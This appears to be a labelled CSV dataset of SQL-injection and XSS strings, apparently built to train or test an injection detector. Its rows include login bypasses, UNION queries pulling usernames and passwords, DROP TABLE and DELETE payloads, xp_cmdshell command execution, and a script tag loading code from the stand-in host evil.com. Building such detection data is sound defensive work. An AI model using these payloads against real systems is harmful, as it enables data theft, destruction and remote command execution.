text,label,group_id
' OR '1'='1,SQL_INJECTION,sqli_0
' OR 1=1 --,SQL_INJECTION,sqli_1
AdMiN'--,SQL_INJECTION,sqli_2
ADMIN'--,SQL_INJECTION,sqli_2
admin'--,SQL_INJECTION,sqli_2
' OR 'A'='A,SQL_INJECTION,sqli_3
' OR 'a'='a,SQL_INJECTION,sqli_3
1' OR '1' = '1,SQL_INJECTION,sqli_4
x' AND 1=1 --,SQL_INJECTION,sqli_5
X' AND 1=1 --,SQL_INJECTION,sqli_5
1 OR 1=1,SQL_INJECTION,sqli_6
"' UNION SELECT NULL,NULL--",SQL_INJECTION,sqli_7
"1 UNION SELECT name, role FROM accounts",SQL_INJECTION,sqli_8
"1 UNION SELECT email, id FROM accounts",SQL_INJECTION,sqli_8
"1 UNION SELECT username, password FROM admin_users",SQL_INJECTION,sqli_8
"1 UNION SELECT name, role FROM admin_users",SQL_INJECTION,sqli_8
"1 UNION SELECT email, id FROM members",SQL_INJECTION,sqli_8
"1 UNION SELECT name, role FROM users",SQL_INJECTION,sqli_8
"1 UNION SELECT email, id FROM admin_users",SQL_INJECTION,sqli_8
"1 UNION SELECT username, password FROM users",SQL_INJECTION,sqli_8
"1 UNION SELECT email, id FROM users",SQL_INJECTION,sqli_8
"1 UNION SELECT name, role FROM members",SQL_INJECTION,sqli_8
"1 UNION SELECT username, password FROM accounts",SQL_INJECTION,sqli_8
"1 UNION SELECT username, password FROM members",SQL_INJECTION,sqli_8
"' UNION SELECT DATABASE(),USER()--",SQL_INJECTION,sqli_9
"' UNION SELECT dAtAbAsE(),UsEr()--",SQL_INJECTION,sqli_9
"' UNION SELECT database(),user()--",SQL_INJECTION,sqli_9
"' AND ExTrAcTvAlUe(1,cOnCaT(0x7e,vErSiOn()))--",SQL_INJECTION,sqli_10
"' AND extractvalue(1,concat(0x7e,version()))--",SQL_INJECTION,sqli_10
"' AND EXTRACTVALUE(1,CONCAT(0X7E,VERSION()))--",SQL_INJECTION,sqli_10
"' AND UpDaTeXmL(1,CoNcAt(0X7E,VeRsIoN()),1)--",SQL_INJECTION,sqli_11
"' AND UPDATEXML(1,CONCAT(0X7E,VERSION()),1)--",SQL_INJECTION,sqli_11
"' AND updatexml(1,concat(0x7e,version()),1)--",SQL_INJECTION,sqli_11
1 OR SLEEP(5),SQL_INJECTION,sqli_12
1 OR SLEEP(8),SQL_INJECTION,sqli_12
1 OR SLEEP(3),SQL_INJECTION,sqli_12
'; WAITFOR DELAY '0:0:8'--,SQL_INJECTION,sqli_13
'; WAITFOR DELAY '0:0:5'--,SQL_INJECTION,sqli_13
'; WAITFOR DELAY '0:0:3'--,SQL_INJECTION,sqli_13
"1 AND BENCHMARK(3000000,MD5(1))",SQL_INJECTION,sqli_14
1; DROP TABLE admin_users,SQL_INJECTION,sqli_15
1; DROP TABLE users,SQL_INJECTION,sqli_15
1; DROP TABLE members,SQL_INJECTION,sqli_15
1; DROP TABLE accounts,SQL_INJECTION,sqli_15
1; DELETE FROM users WHERE 1=1,SQL_INJECTION,sqli_16
1; DELETE FROM admin_users WHERE 1=1,SQL_INJECTION,sqli_16
1; DELETE FROM accounts WHERE 1=1,SQL_INJECTION,sqli_16
1; DELETE FROM members WHERE 1=1,SQL_INJECTION,sqli_16
'; INSERT INTO members VALUES('x')--,SQL_INJECTION,sqli_17
'; INSERT INTO users VALUES('x')--,SQL_INJECTION,sqli_17
'; INSERT INTO accounts VALUES('x')--,SQL_INJECTION,sqli_17
'; INSERT INTO admin_users VALUES('x')--,SQL_INJECTION,sqli_17
1' #,SQL_INJECTION,sqli_18
' /*comment*/ OR '1'='1,SQL_INJECTION,sqli_19
' /*CoMmEnT*/ OR '1'='1,SQL_INJECTION,sqli_19
' /*COMMENT*/ OR '1'='1,SQL_INJECTION,sqli_19
'; EXEC Xp_cMdShElL('dIr')--,SQL_INJECTION,sqli_20
'; EXEC XP_CMDSHELL('DIR')--,SQL_INJECTION,sqli_20
'; EXEC xp_cmdshell('dir')--,SQL_INJECTION,sqli_20
1); EXEC MASTER..XP_CMDSHELL 'WHOAMI'--,SQL_INJECTION,sqli_21
1); EXEC master..xp_cmdshell 'whoami'--,SQL_INJECTION,sqli_21
1); EXEC mAsTeR..xP_CmDsHeLl 'WhOaMi'--,SQL_INJECTION,sqli_21
' OR ''=',SQL_INJECTION,sqli_22
""" OR ""1""=""1",SQL_INJECTION,sqli_23
1' AND '1'='1,SQL_INJECTION,sqli_24
' HAVING 1=1--,SQL_INJECTION,sqli_25
' GROUP BY cOlUmNnAmEs HAVING 1=1--,SQL_INJECTION,sqli_26
' GROUP BY COLUMNNAMES HAVING 1=1--,SQL_INJECTION,sqli_26
' GROUP BY columnnames HAVING 1=1--,SQL_INJECTION,sqli_26
%27 OR 1=1--,SQL_INJECTION,sqli_27
1' ORDER BY 10--,SQL_INJECTION,sqli_28
' OR SLEEP(5)#,SQL_INJECTION,sqli_29
<sCrIpT>AlErT(1)</ScRiPt>,XSS,xss_0
<script>alert(1)</script>,XSS,xss_0
<SCRIPT>ALERT(1)</SCRIPT>,XSS,xss_0
<script>alert(document.cookie)</script>,XSS,xss_1
<sCrIpT>AlErT(DoCuMeNt.cOoKiE)</ScRiPt>,XSS,xss_1
<SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>,XSS,xss_1
<sCrIpT SrC=//EvIl.cOm/x.jS></ScRiPt>,XSS,xss_2
<SCRIPT SRC=//EVIL.COM/X.JS></SCRIPT>,XSS,xss_2
<script src=//evil.com/x.js></script>,XSS,xss_2
<img src=x onerror=alert(1)>,XSS,xss_3
<IMG SRC=X ONERROR=ALERT(1)>,XSS,xss_3
<iMg sRc=x oNeRrOr=aLeRt(1)>,XSS,xss_3
<svg onload=alert(1)>,XSS,xss_4
<sVg oNlOaD=AlErT(1)>,XSS,xss_4
<SVG ONLOAD=ALERT(1)>,XSS,xss_4
<body onload=alert(1)>,XSS,xss_5
<BODY ONLOAD=ALERT(1)>,XSS,xss_5
<bOdY OnLoAd=aLeRt(1)>,XSS,xss_5
<iNpUt oNfOcUs=aLeRt(1) AuToFoCuS>,XSS,xss_6
<INPUT ONFOCUS=ALERT(1) AUTOFOCUS>,XSS,xss_6
<input onfocus=alert(1) autofocus>,XSS,xss_6
"<a href=""javascript:alert(1)"">click</a>",XSS,xss_7
